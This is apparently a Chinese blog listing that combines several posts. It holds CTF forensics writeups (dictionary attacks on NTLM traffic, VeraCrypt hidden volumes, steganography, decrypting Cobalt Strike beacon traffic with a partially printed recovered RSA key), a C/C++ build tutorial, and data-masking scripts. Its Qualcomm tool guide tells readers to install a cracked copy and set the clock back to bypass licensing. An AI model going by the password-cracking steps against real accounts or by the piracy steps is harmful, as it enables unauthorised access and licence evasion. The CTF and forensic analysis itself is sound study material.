用rockyou.txt字典爆破也是一会就出了，得到密码：36521478 然后我们到编辑-首选项-Protocols-NTLM SSP里输入得到的密码，并点击应用即可解密流量 解密完后，我们即可在文件-导出对象-SMB中看到传输的文件，流量中传了一个secret.doc，我们尝试保存到本地 发现直接打开会报错，因此我们用010打开，发现文件数据好像被逆置了 因此我们可以直接用CyberChef把数据逆置回来，并保存到本地 数据逆置后打开，发现文件还是报错，因此我们新建一个MS97-2003的doc文件，用010来diff一下 发现是oleHeader(0x200字节)被删除了，因此我们接下来要尝试修复这个doc的oleheader 这一个考点以前确实没有遇到过，这里参考了官方的wp 0-0x7是文件签名是固定的 0x8-0x17文件的标识一般全零 0x18-0x1B文件格式的修订号和版本号,可以认为是固定的常量 0x1C-0x1D:字节序, 一般都用小端序0xFEFF 0x1E-0x1F每个扇区的大小,一般来说就是9 0x20-0x2Bshort-sector的大小,一般是6 0x2C-0x2F表示FAT表中有几个DWORD是有效的 0x30-0x33整个复合文档的根目录所在扇区的索引号,找root,entry,找是第几个扇区,注意算的时候需要把第一个扇区排除 0x6800/0x200-1=0x33 0x34-0x3B固定值 0x3C-0x3F短扇区分配表的扇区位置,一般紧接着root Entry,得看rootEntry占用多少扇区,这里是占用两个扇区,因此这里的值应该填0x35 0x40-0x43 短扇区分配表占用的扇区数,可以看到就占一个扇区 0x44-0x4B主扇区分配表的扩展部分的索引以及其大小,因为文件比较小没有用到扩展部分,第一个应该是-2即0xFEFFFFFF,大小为0 0x4C-后面是主扇区分配表,因为文件不是很大,基本只有前面几个字节是有意义的,后面都是0xFF,取值和Root Entry的扇区号有关,一般就是root扇区倒着写,因为root为33,这里我们填一个0x32000000 最后修复完的oleheader如下所示： 尝试用word打开修复后的doc，发现需要密码，因此直接尝试用PasswareKit爆破 打开并输入爆破得到的密码，把白色的文字标红后即可得到最后的flag：flag{u_are_a_g00d_OLE_Repairer} 题目名称 1z_F0r3ns1cs_1 题目附件给了一个1z.vmdk虚拟磁盘文件，因此我们直接用DiskGenius打开并恢复被删除的文件 可以得到一个秘籍.docx还有一个txt文件 改docx文件后缀为zip并解压，可以在/word/theme中得到一个bat文件 打开后可以得到一串base64编码，解码后可以得到如下内容： th1s_14_y0ur_key!!!!2333 WHAT YOU’RE GONNA DO WITH IT? 提示了我们一个密钥，然后我们回头去看另一个txt文件，发现文件大小正好是3MB 因此猜测可能是VC加密容器，上面的密钥就是VC的加密密钥 使用VC挂载后可以得到两个txt文件，还有一张jpg图片 flag(.txt文件中没有什么关键的信息，因此我们把目光集中到另一个txt上 这里可能需要亿点点脑洞，当我们把dead_end.txt作为密钥文件去挂载之前的那个txt的时候 可以得到一个隐藏卷 打开后可以得到一个t0p_s1cr3t.txt，内容如下： YOU ARE AWESOME!!!!BUT NOT ENOUGH,Here is flag1: DASCTF{N0w_u_knOw_H1dden_v0lum3_ AND HERE IS A LITTLE REMINDER,THE MASK IS: U????Klsq ONLY LOWERCASE AT 1 AND NUMBERS AT 2,3,4 得到了第一段的flag以及一个掩码，联想到之前得到的那张jpg 猜测需要我们通过掩码生成字典，然后去解密steghide 因此我们写个脚本按照掩码的格式生成一下字典 from string import digits, ascii_lowercase mask = \"U?u?d?d?dKlsq\" for a in ascii_lowercase: for b in digits: for c in digits: for d in digits: passwd = f\"U{a}{b}{c}{d}Klsq\" print(passwd) 然后直接用stegseek爆破即可得到第二段flag：Of_v3r@cr1pt\u002690_0nnnnnnnnnnn!!!a\u003e?#P2} 把两段flag合起来即可得到最后的flag：DASCTF{N0w_u_knOw_H1dden_v0lum3_Of_v3r@cr1pt\u002690_0nnnnnnnnnnn!!!a\u003e?#P2} 题目名称 手把天尊 不说别的了，这样吧你先按住RT+B使出看破斩，随后RT+A特殊纳刀，然后轻触RT使用聚合拔刀气刃斩，最后RT+Y打出气刃突刺，派生气刃兜割。别忘了把flag小写包上DASCTF。 附件给了一个流量包文件，打开发现主要是USB流量 因此首先拿CTF-NetA梭一把，发现一共有七个IP 发现解出来的信息里没有什么关键的内容，画出来的鼠标轨迹图也是 然后我们结合题面信息，猜测题面考察的是游戏手柄的流量 然后看CTF-NetA输出的结果，猜测主要是在2.8.2或2.4.2这两个IP传的数据中 然后Wireshark打开，发现2.4.2传的数据不多 然后查看2.8.2时，发现传输的数据包较多，传输的大部分数据长度都为75 因此这个就是游戏手柄的流量，和平常分析USB流量一样，先用tshark导出传输的数据 tshark -r 13.pcapng -Y '(usb.src == \"2.8.2\") \u0026\u0026 (frame.len == 75)' -T fields -e usb.capdata \u003e data.txt 然后我们尝试根据数据的特征，去分析其中的规律 参考链接：https://blog.csdn.net/weixin_51914644/article/details/136098281 发现前八字节中只有第三字节的数据是单调递增且每次固定加一的，因此不是我们想要的数据 然后发现再变化的数据主要就下图中的这几个位置 从上面的参考链接中我们知道，手柄的关键数据主要就四个：左扳机、右扳机、左摇杆、右摇杆 看了赛后官方WP后知道，第9字节是左扳机的数据（按下去后数值会变大，最大到0xff），第10字节是右扳机的数据 然后第11-14字节是左摇杆的数据，第15-18字节是右摇杆的数据，xy的偏移量分别占其中的两字节 知道了具体数据的位置后，后续的步骤就和鼠标流量分析一样了，通过偏移量计算坐标然后画图 根据数据特征可以看出来这里右摇杆其实是不动的，只有左摇杆在移动 因此我们可以尝试画出所有左扳机按下时，左摇杆的移动轨迹图 from matplotlib import pyplot as pl","date":"2025-05-09","objectID":"/posts/32c3b27/:0:0","tags":["CTF","Misc","Writeup"],"title":"DASCTF 2024最后一战 Misc Writeup","uri":"/posts/32c3b27/"},{"categories":["Research"],"content":"复现论文实验的时候需要用到Qualcomm高通的套件 软件安装和使用过程中遇到了很多的问题，因此打算记录一下遇到的问题和对应的解决方案 Before All 本文涉及的内容大部分取自互联网，如有侵权请联系删除 软件安装 首先，我们可以在XDA论坛上找到破解版的安装包 然后注意安装的时候要把时间调整到2022-01-01，并且断网安装 运行安装程序，安装完VC++的依赖和Manager后，会有个弹窗提示你需要Patch并Refresh一下 然后为了防止本地时间改变对日常使用的影响，我把上面的软件安装到Windows10的VMware虚拟机中了，并且关闭了时间同步 软件使用 QCAT QCAT 主要用于分析无线通信协议日志，验证设备对通信标准（如 LTE、5G）的符合性。 它支持日志解析、性能评估和协议分析，帮助工程师理解设备在网络中的行为。 直接打开QCAT然后选择打开本地保存的信令文件即可 QXDM QXDM 是一个实时调试和诊断工具，用于读取设备的诊断数据、捕获日志、监控信号状态 并执行自定义命令（如 AT 指令或高通特定命令） 软件安装完成后，我们需要参考这篇文章，在Windows上安装一下高通的驱动 安装完驱动后，电脑才能正常识别到手机开启的诊断端口 然后参考这篇文章的步骤，用adb打开手机的诊断端口后可以用QXDM抓数据了 # 打开诊断端口的命令，不同手机可能不同，这里我简要记录了一下 # 小米手机可以用下面这个命令 adb shell su setprop sys.usb.config diag,diag_mdm,adb # 摩托罗拉手机要用下面这个命令 adb shell \"su -c 'setprop sys.usb.config diag,serial_cdev,rmnet,dpl,qdss,adb'\" Tips：如果使用过程中发现ADB识别不到设备，可以查看手机是否打开USB调试，如果已打开USB调试，还是识别不到的话，就尝试在设备管理器里把ADB Interface卸载并重装 小米开启诊断端口后，设备管理器显示如下： 然后QXDMd点击左上角的按钮，选择对应的手机端口连接后即可正常抓取数据 摩托罗拉开启诊断端口后，设备管理器显示如下： 然后QXDM连接上手机后即可正常抓取数据 我这里尝试捕获了一下MIB消息，发现可以用QXDM成功捕获 ","date":"2025-04-23","objectID":"/posts/95cea53/:0:0","tags":["Research","Skills"],"title":"Qualcomm高通 诊断日志分析工具的安装及使用","uri":"/posts/95cea53/"},{"categories":["Skills"],"content":"最近科研上遇到一些项目需要使用C/C++开发，因此打算学习并记录一下 环境配置 作者这里使用的系统是Ubuntu20.04 LTS 首先需要安装gcc和cmake bashsudo apt-get install build-essential sudo apt install cmake # 如果cmake的版本太低，可以尝试手动下载 apt-get autoremove cmake mv cmake-3.5.0-Linux-x86_64.tar.gz /usr cd /usr tar zxvf cmake-3.5.0-Linux-x86_64.tar.gz ln -s /usr/cmake-3.5.0-Linux-x86_64/bin/* /usr/bin/ cmake入门 这里就用下面这个例子来简要说明一下，通常一个C/C++项目的结构如下所示： project ├── bin │ └── main ├── build ├── CMakeLists.txt ├── include │ ├── test1.h │ └── test2.h └── src ├── main.cpp ├── test1.cpp └── test2.cpp 其中各个文件的内容如下所示 CMakeLists.txt # 项目所支持的最低cmake版本 cmake_minimum_required(VERSION 3.10) # 设置项目名称 project(project) # 最后生成的可执行文件保存在bin目录下 set(EXECUTABLE_OUTPUT_PATH ${PROJECT_SOURCE_DIR}/bin) # 将源码文件保存在src目录下，并赋值到SRC_LIST中 aux_source_directory(src SRC_LIST) # 指定头文件的路径 include_directories(include) # 声明生成的可执行文件名和所依赖文件的路径 add_executable(main ${SRC_LIST}) test1.h #ifndef _TEST1_H // 防止头文件被重复包含的预处理指令 #define _TEST1_H // 防止这个头文件在同一个编译单元中被多次包含 #include\u003ciostream\u003e void testfunc1(); // // 声明一个函数 testfunc1() // 结束 #ifndef 的条件编译块 #endif /*_TEST1_H*/ test2.h #ifndef _TEST2_H // 防止头文件被重复包含的预处理指令 #define _TEST2_H // 防止这个头文件在同一个编译单元中被多次包含 #include\u003ciostream\u003e void testfunc2(); // // 声明一个函数 testfunc2() // 结束 #ifndef 的条件编译块 #endif /*_TEST22_H*/ test1.cpp #include \"test1.h\" #include \u003ciostream\u003e using namespace std; void testfunc1(){ cout \u003c\u003c \"this is testfunc1\" \u003c\u003c endl; } test2.cpp #include \"test2.h\" #include \u003ciostream\u003e using namespace std; void testfunc2(){ cout \u003c\u003c \"this is testfunc2\" \u003c\u003c endl; } main.cpp #include \u003ciostream\u003e #include \"test1.h\" #include \"test2.h\" using namespace std; int main() { cout \u003c\u003c \"Hello\" \u003c\u003c endl; testfunc1(); testfunc2(); return 0; } 上面的文件写好后，我们执行以下命令编译即可 cd build \u0026\u0026 cmake make 编译完成后，我们就能在bin目录下找到生成的可执行文件main ","date":"2025-04-23","objectID":"/posts/e393438/:0:0","tags":["Skills","Language"],"title":"C/C++程序开发学习记录","uri":"/posts/e393438/"},{"categories":["Writeup"],"content":"2025 能源网络安全大赛 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 black_white 解压附件压缩包，得到得到一张PNG，010打开发现末尾藏了一张数据逆置的PNG 把末尾的PNG提取出来，可以得到两张由黑白像素组成的图片，同时两张图片的分辨率也是一样的 看到黑白图片，第一反应便是把黑白像素转为0和1 然后再结合两张这个数量，猜测是提取二进制数据后再进行二进制操作(异或的可能性最大) 因此写个脚本尝试一下 from PIL import Image import numpy as np import libnum img_array1 = np.array(Image.open(\"black_white.png\")) img_array2 = np.array(Image.open(\"download.png\")) data = ((img_array1 \u0026 1) ^ (img_array2 \u0026 1)).flatten() bin_data = \"\".join(data.astype(str)) # 将0/1转换为字符串后连接 res = libnum.b2s(bin_data) print(res) # with open(\"flag.zip\",'wb') as f: # f.write(res) 发现二进制数据异或后可以得到一个压缩包 于是我们保存为flag.zip，打开得到一个未知后缀的flag文件 我们在010中打开这个文件 经过尝试，发现在前面补上BMP的文件头42 4D并改后缀为.bmp后可以得到一张被篡改过的汉信码 仔细对比正常的汉信码，可以发现是左下角被旋转了180° 因此我们在PPT中修复好，然后扫码即可得到最后的flag：flag{89b58e77-7b42-4fd1-9e58-e50d98cc5894} 题目名称 alarm_clock 解压附件压缩包，得到一个alarm_clock.vmdk，我们尝试用DiskGnuis挂载并恢复被删除的文件 恢复可以得到一个wav文件和一个加密的压缩包 打开wav文件听一下，发现是SSTV，用工具识别后可以得到压缩包的解压密码：z@Wa1uDu0 解压后可以得到一个data.txt，里面的数据格式如下： 结合上面扫出来的SSTV图像种的时钟，猜测数字代表的就是时钟上刻度的方向，有几个数字就代表往这个方向前进几格 然后每一行都是从原点开始，因此我们写一个脚本按照数字的顺序画轨迹图 import matplotlib.pyplot as plt import math import os def number_to_angle(num): return (int(num) * 30) % 360 def angle_to_coord(angle): rad = math.radians(angle - 90) return (math.cos(rad), math.sin(rad)) def func1(data): os.makedirs(\"output\", exist_ok=True) for i, path in enumerate(data): plt.figure(figsize=(8, 8)) ax = plt.gca() ax.set_aspect('equal', adjustable='box') plt.title(f'Figure {i+1}') x_coords = [0] y_coords = [0] current_x, current_y = 0, 0 for num in path: angle = number_to_angle(num) dx, dy = angle_to_coord(angle) current_x += dx current_y += dy x_coords.append(current_x) y_coords.append(-1 * current_y) plt.plot(x_coords, y_coords, marker='o', markersize=3, color='blue') plt.grid(True, alpha=0.3) plt.xlim(-8, 8) plt.ylim(-8, 8) filename = f'output/{i+1:02d}.png' plt.savefig(filename, dpi=100, bbox_inches='tight') plt.close() print(f'Saved: {filename}') if __name__ == \"__main__\": data = [] with open(\"data.txt\", 'r') as f: lines = f.read().split() for line in lines: data.append(line.split(',')) # print(data) func1(data) 运行脚本画图后即可得到最后的flag：flag{5879016c-301b-4840-95bf-be72b379b21e} 题目名称 Bluetooth 用Wireshark打开流量包，发现会报错 因此我们尝试用010打开，发现文件末尾有多余的数据：quaternary 有道翻译一下，发现这个词有四进制的意思 删除末尾多余数据后再翻看流量包，发现有很多个从remote()发到localhost()的数据包 并且仔细比较可以发现，长度为52的数据包，payload变化的数据主要在倒数第三位 我们尝试使用tshark把长度为52的数据包的payload提取出来分析 tshark -r Bluetooth.pcapng -Y '(_ws.col.protocol == \"L2CAP\") \u0026\u0026 (frame.len == 52)' -T fields -e 'btl2cap.payload' \u003e 1.txt 然后我们在vscode中把倒数第三位的值单独提取出来分析，发现数据主要是由01248这几个数字构成的 看到这几个数字，第一反应是云影密码，但是经过尝试发现解密后得不到有用的信息 # 云影密码 ciphey=\"0222000444000222000444000222000444008880001110002220004400011100222000222000444000222000888000222000888000444000888000111008880002220002200022200444000111022200111000888000220001110001110008880004440011100111000888000111000444000222000444000110002220002220004440002220001110022200044400022200022200011100044000888000222000111000888000111000222000111008880011100111000222000444000222000220002220044400022200011100011100044400088800222000111000888000222000111000111000888004440002220001110008880011100011100111000888002220002220001110004440008880002220002220004440001110222000111000888000444001100011100088800044400011100011100088800022200044400011000444000888000222000111000888000111000888000111008880002220004440001110088800044400222000111000888000444000111000111000888000222001110011100088000222000444000220004440022200011100011100088800011100044400111000888000222000888000222000444000111000222000111000888000111000111000111000888000444000111002220008880008880002220\" enc_list=ciphey.split('0') res=[] print(enc_list) for item in enc_list: sum=0 for num in item: sum += int(num) res.append(chr(sum+64)) print(''.join(res)) # @F@@L@@F@@L@@F@@L@X@@C@@F@@H@@C@F@@F@@L@@F@@X@@F@@X@@L@@X@@C@X@@F@@D@@F@L@@CF@C@@X@@D@@C@@C@@X@@L@C@C@@X@@C@@L@@F@@L@@B@@F@@F@@L@@F@@C@F@@L@@F@@F@@C@@H@@X@@F@@C@@X@@C@@F@@C@X@C@C@@F@@L@@F@@D@@F@L@@F@@C@@C@@L@@X@F@@C@@X@@F@@C@@C@@X@L@@F@@C@@X@C@@C@C@@X@","date":"2025-04-21","objectID":"/posts/87bd986/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 能源网络安全大赛 Misc Writeup","uri":"/posts/87bd986/"},{"categories":["Writeup"],"content":"周末闲来无事，找了个比赛练练手，Misc题整体上来说出的还是比较传统，光速AK下机 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 three 第一层，Java盲水印 第二层，CyberChef一把梭 第三层给了一个加密压缩包和一个流量，从流量里找到字典，然后爆破即可 解压压缩包即可得到第三段flag：5d0cb5695077 把第二段flag改小写，然后三段合起来即可得到最后的flag：flag{8f02d3e7-ce89-4d6b-830e-5d0cb5695077} 题目名称 小套不是套 附件给了以上几个文件，扫码可以得到tess.zip的解压密码 套.zip可以直接爆破CRC得到里面的内容 R1JWVENaUllJVkNXMjZDQ0pKV1VNWTNIT1YzVTROVEdLVjJGTVYyWU5NNFdRTTNWR0ZCVVdNS1hNSkZXQ00zRklaNUVRUVRCR0pVVlVUS0VQQktHMlozWQ== Key is SecretIsY0u mushroom.zip是伪加密，去除伪加密后可以得到一张JPG 末尾藏了一张去除了文件头的PNG，提出来后发现有明显的Oursecret的特征 输入之前得到的密钥SecretIsY0u解密即可得到最后的flag：flag{6f6bf445-8c9e-11ef-a06b-a4b1c1c5a2d2} 题目名称 No.shArk 翻看流量包，发现上传了一张cat.png 图片末尾有一些信息：keyis:keykeyishere cat.png的文件名以及宽高大小相等提示了我们是猫脸变换 直接用下面这个脚本爆破一下即可得到第一段flag：flag{46962f4d-8d29- import matplotlib.pyplot as plt import cv2 import numpy as np def arnold_decode(image, shuffle_times, a, b): decode_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h # 或N=w for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): # 按照公式坐标变换 new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N new_y = ((-a) * ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] image = np.copy(decode_image) return image def arnold_brute(image,shuffle_times_range,a_range,b_range): for c in range(shuffle_times_range[0],shuffle_times_range[1]): for a in range(a_range[0],a_range[1]): for b in range(b_range[0],b_range[1]): print(f\"[+] Trying shuffle_times={c} a={a} b={b}\") decoded_img = arnold_decode(image,c,a,b) output_filename = f\"flag_decodedc{c}_a{a}_b{b}.png\" cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) if __name__ == \"__main__\": img = cv2.imread(\"download.png\") arnold_brute(img, (1,6), (1,11), (1,11)) 继续翻看流量包，发现DNS流量中有可疑数据 用tshark提取出来，从数据长度和数据形状可以看出来很明显隐写了一个二维码 提取出来后发现二维码定位块缺失，用PPT补一下定位块 扫码得到：Y0U_Fi8d_ItHa@aaHH 继续翻看流量包，发现FTP中还传了两个文件 经过diff发现其中SNOW.DOC和原始项目中的文件是一样的，然后那张next.jpg如下 发现这张图片可以用之前的密钥：keykeyishere 解silenteye得到猫脸变换的参数：shuffle=5,a=7,b=3（但是其实直接爆破也能出。。） 尝试把HTTP流量中传输的数据都导出来，发现在w1.html中发现可疑的信息 结合之前SNOW.DOC的提示，猜测就是这段文本里用SNOW隐写了内容 尝试把html文件后缀改为.txt，然后用之前得到的密钥：Y0U_Fi8d_ItHa@aaHH 解密SNOW隐写即可得到第二段的flag：11ef-b3b6-a4b1c1c5a2d2} 把上述两段flag合起来即可得到最后的flag：flag{46962f4d-8d29-11ef-b3b6-a4b1c1c5a2d2} 题目名称 USB USB键盘流量分析，CTF-NetA一把梭：flag{ebdfea9b-3469-41c7-9070-d7833ecc6102} ","date":"2025-04-20","objectID":"/posts/e9c4fc7/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 UCSCCTF Misc Writeup","uri":"/posts/e9c4fc7/"},{"categories":["CTF"],"content":"最近的CTF比赛中经常出现数据安全的板块(尤其是安恒承办的比赛) 感觉这类题目是可以靠积累来提升解题速度的，因此准备写这样一篇博客来总结一下常见的考点 数据读取 从xlsx中读取数据并实现脱敏 import pandas as pd import hashlib def desensitize_name(name): length = len(name) if length == 2: return name[0] + '*' elif length == 3: return name[0] + '*' + name[2] elif length == 4: return name[0] + '**' + name[3] else: return name # 对于非2-4字姓名，原样返回（可根据需求修改） def desensitize_phone(phone): if len(phone) == 11: return phone[:3] + '*****' + phone[8:] return phone # 对于非11位手机号，原样返回 def desensitize_id(id_num): if len(id_num) \u003e= 6: return id_num[:6] + '*' * (len(id_num) - 6) return id_num # 对于不足6位的身份证号，原样返回 def desensitize_bank_card(card): card_str = str(card).strip() # 转换为字符串并去除空白 length = len(card_str) if length \u003c 14: return '*' * length else: # 计算需要保留的中间部分 keep_length = max(0, length - 14) # 总长度-14=中间保留位数 middle = card_str[4:4+keep_length] if keep_length \u003e 0 else '' return '****' + middle + '*' * 10 def desensitize_email(email): parts = email.split('@') if len(parts) == 2: local_part = parts[0] # 找到最后一个.的位置 last_dot = local_part.rfind('.') if last_dot != -1: # 保留.及其前面的字符 to_keep = local_part[:last_dot+1] to_mask = local_part[last_dot+1:] else: to_keep = '' to_mask = local_part masked = to_keep + '*' * len(to_mask) return masked + '@' + parts[1] return email # 对于不包含@的email，原样返回 def desensitize_gender(gender): return '未知' def desensitize_wechat(wechat): if wechat: return '*' * len(wechat) return wechat def concatenate_and_hash(file_path): # 读取Excel文件 df = pd.read_excel(file_path) # 移除标题行（第一行） data_rows = df.iloc[1:] if len(df) \u003e 1 else df # 按照先行后列的顺序拼接所有单元格内容 concatenated_str = '' for _, row in data_rows.iterrows(): for value in row: concatenated_str += str(value) if pd.notna(value) else '' # 计算MD5哈希值 md5_hash = hashlib.md5(concatenated_str.encode('utf-8')).hexdigest() return md5_hash if __name__ == \"__main__\": # 读取Excel文件 df = pd.read_excel('data.xlsx') # 应用脱敏函数 df['姓名'] = df['姓名'].apply(desensitize_name) df['手机号'] = df['手机号'].astype(str).apply(desensitize_phone) df['身份证号'] = df['身份证号'].astype(str).apply(desensitize_id) df['银行卡号'] = df['银行卡号'].astype(str).apply(desensitize_bank_card) df['Email'] = df['Email'].apply(desensitize_email) df['性别'] = df['性别'].apply(desensitize_gender) df['微信号'] = df['微信号'].apply(desensitize_wechat) # 保存脱敏后的数据到新文件 df.to_excel('desensitized_data.xlsx', index=False) print(\"[+] 数据脱敏完成，结果已保存到 desensitized_data.xlsx\") file_path = 'desensitized_data.xlsx' # 替换为你的Excel文件路径 result = concatenate_and_hash(file_path) print(f\"[+] 拼接后的字符串的MD5值为: {result}\") 从csv中读取数据并实现脱敏 import csv import hashlib import base64 data_list = [] res_list = [] def basedecode(line): try: if line[-1] == \"Base32\": for i in range(1,6): line[i] = base64.b32decode(line[i]).decode() elif line[-1] == \"Base64\": for i in range(1,6): line[i] = base64.b64decode(line[i]).decode() elif line[-1] == \"Base85\": for i in range(1,6): line[i] = base64.b85decode(line[i]).decode() except: pass def username_solve(username): res = '' if len(username) == 2: res = username[0] + '*' else: res = username[0] + \"*\"*(len(username)-2)+username[-1] return res def password_solve(pwd): md5_hash = hashlib.md5() md5_hash.update(pwd.encode('utf-8')) res = md5_hash.hexdigest() return res def name_solve(name): sha1_hash = hashlib.sha1() sha1_hash.update(name.encode('utf-8')) res = sha1_hash.hexdigest() return res def id_solve(id): res = \"*\"*6 + id[6:10] + \"*\"*8 return res def phone_solve(phone): res = phone[:3] + \"*\"*4 + phone[7:] return res if __name__ == \"__main__\": with open(\"data.csv\", \"r\", encoding='utf-8') as f: reader = csv.reader(f) for row in reader: data_list.append(row) data_list[0].remove(data_list[0][6]) res_list.append(data_list[0]) for line in data_list[1:]: basedecode(line) line[1] = username_solve(line[1]) line[2] = password_solve(line[2]) line[3] = name_solve(line[3]) line[4] = id_solve(line[4]) line[5] = phone_solve(line[5]) line.remove(line[6]) res_list.append(line) with open('out.csv',\"w\",newline='',encoding='utf-8') as f: writer = csv.writer(f) writer.writerows","date":"2025-04-20","objectID":"/posts/c49ae8a/:0:0","tags":["CTF","Misc"],"title":"Misc-数据安全","uri":"/posts/c49ae8a/"},{"categories":["Writeup"],"content":"最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了 趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题 本文中涉及的具体题目附件可以进我的知识星球获取 线上初赛 题目名称 easydatalog 题面信息如下： 请你对附件中的日志文件进行分析，找出“张三”的身份证号和手机号，譬如其身份证号是119795199308186673，手机号是73628276413，则提交的flag为“119795199308186673_73628276413”。 题目附件给了 access.log 和 error.log 两个日志文件 简单翻看后，我们重点关注error.log，发现传了一个PHP的Webshell 继续翻看日志文件，可以发现出题人传了一个压缩包还有一个JPG图片 由于是分段传输，因此我们手动删除每段间的无效数据，把这两个文件提取出来 发现压缩包是加密的，里面有个data.csv，因此猜测需要从那张JPG图片中得到解压密码 经过尝试，发现JPG图片是盲水印隐写，直接用工具提取即可 使用得到的密码解压压缩包即可得到张三的信息，即flag：DASCTF{30601319731003117X_79159498824} 题目名称 糟糕的磁盘 题目附件给了五个img文件，查看后发现是Linux下RAID格式的磁盘文件 压缩包注释中也给了提示：I only remember the block size is 512KB 方法一：(UFS直接重组) 软件下载链接：UFS Explorer Professional Recovery 9.18 直接用UFS打开五个img文件即可，软件会自动重组，然后点击最下面那个kali 发现里面有一张key.png和一个secret文件，其中secret文件大小为10MB 因此猜测是VC创建的加密镜像，密钥就是key.png 尝试使用key.png作为密钥挂载，挂载成功后得到flag.txt 打开即可得到flag：DASCTF{R41D_4ND_D15K_M4573R} 方法二：在Ubuntu下用losetup和mdadm进行组装挂载 在WSL2(Ubuntu20.04)中运行一下命令即可成功挂载 sudo losetup -fP m8X4exzG.img # 绑定第一个镜像文件到一个空闲的 loop 设备，并解析其分区表 sudo losetup -fP Fsiq6lKn.img sudo losetup -fP gSoNiXLC.img sudo losetup -fP suPVGqm6.img sudo losetup -fP uGZ85OzT.img sudo losetup -a # 查看当前所有已绑定的 loop 设备及其对应的文件 cat /proc/mdstat # 查看当前系统中已组装的 RAID 设备状态 sudo mount /dev/md127 tmp # 挂载 RAID 设备 md127 到 tmp 目录，尝试访问其内容 ls -al tmp sudo umount tmp # 卸载 tmp 目录，释放 md127 设备的挂载 sudo mdadm --stop /dev/md127 # 停止 RAID 设备 md127，释放相关 loop 设备的占用 sudo losetup -d /dev/loop0 # 解除 loop0 设备的绑定 sudo losetup -d /dev/loop1 sudo losetup -d /dev/loop2 sudo losetup -d /dev/loop3 sudo losetup -d /dev/loop4 # 检查 /dev/loop0 至 /dev/loop4 上的每个设备的 RAID 元数据（查看设备是否是 RAID 阵列的一部分） sudo mdadm --examine /dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4 # 创建一个名为 /dev/md127 的 RAID 0 阵列，包含 5 个设备（/dev/loop0 至 /dev/loop4） sudo mdadm --create /dev/md127 --level=0 --raid-devices=5 /dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4 Tips:这里我的WSL2可能启用了 mdadm 的 自动检测和组装，因此会在发现 RAID 元数据时自动创建 /dev/md127 但是当我尝试在kali上执行以上操作的时候，它不会自动识别 RAID 阵列并自动挂载 因此还是建议在Ubuntu系统下进行以上操作 题目名称 DSASignatureData 题面信息如下： 请你对附件中的流量文件进行分析，在该流量里有一些个人信息数据。附件中还有一份个人信息的签名数据 data-sign.csv（其中签名算法采用 DSA，哈希算法采用 SHA256）和一组公钥文件（位于 public 文件夹中，文件名格式为 public-XXXX.pem，其中 XXXX 为 userid 左侧补零至四位数，即个人用户对应的公钥文件）。由于数据可能在传输过程中被篡改过，因此需要你进行签名验证，验证数据是否被篡改。找出被篡改过的个人信息数据并保存到新的 csv 文件中（文件编码 utf-8，文件格式和 data.csv 保持一致），并将该文件上传至该题的校验平台（在该校验平台里可以下载该题的示例文件 example.csv，可作为该题的格式参考），校验达标即可拿到 flag。 题面名称 easyrawencode 题目名称 cscs 题目附件给了一个流量包，稍微翻看了一下发现主要是HTTP流量 然后结合题目的名称已经流量包中的特征submit.php以及心跳包，可以知道是CobalStrike流量分析 但是这题和之前遇见的常规的CS流量直接给java序列化后的密钥对文件不同，这题它给了我们 Beacon 在 Cobalt Strike 中，Beacon 是一种后门 payload，旨在提供持续的访问控制和通信通道。它被植入目标系统后，能够通过多种隐蔽的通信方式（如 HTTP/HTTPS）与攻击者的控制服务器进行定期的交互，执行命令、获取敏感信息并保持持久化。这使得 Beacon 成为渗透测试和红队操作中用于维持长期控制、获取系统信息和横向移动的重要工具。 然后去网上找相关的文章，可以找到下面这些文章： https://www.freebuf.com/articles/system/327060.html https://www.freebuf.com/articles/network/407982.html 从文章中我们可以知道 mB9u 其实是上图第三步中Beacon随机生成的URL地址 并且结合文章中中的计算方法 (ord('m')+ord('B')+ord('9')+ord('u')) % 256 = 93 可以找到受害者的主机是64位的(上面结果如果是92对应32位，93则对应64位) 然后我们跟着参考文章中的，使用 1768.py 去解析题目中给我们的 Beacon 文件 我们可以在解析结果中得到公钥，用CyberChef转换一下，并补上PEM的开头和结尾 -----BEGIN PUBLIC KEY----- MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahxXKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== -----END PUBLIC KEY----- 然后我们手动解析一下公钥，并尝试分解一下n 发现yafu可以分解 n 得到 p 和 q 我们使用rsatool.py结合得到的 p 和 q 生成一下PEM格式的私钥 -----BEGIN RSA PRIVATE KEY----- MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1 